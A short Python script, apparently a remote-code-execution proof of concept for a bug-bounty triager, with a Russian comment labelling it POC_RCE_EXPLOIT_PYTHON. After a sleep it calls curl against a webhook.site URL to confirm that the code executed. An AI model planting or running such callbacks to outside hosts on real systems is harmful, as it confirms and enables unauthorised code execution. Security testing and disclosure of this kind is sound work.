# rce_test.py
import subprocess
import time

# Идентификатор для триажера: POC_RCE_EXPLOIT_PYTHON
time.sleep(5)
subprocess.run(["curl", "https://webhook.site/5d2815a1-7a4c-4d21-9462-22b22be8d349/PYTHON_RCE_CONFIRMED"], shell=False)
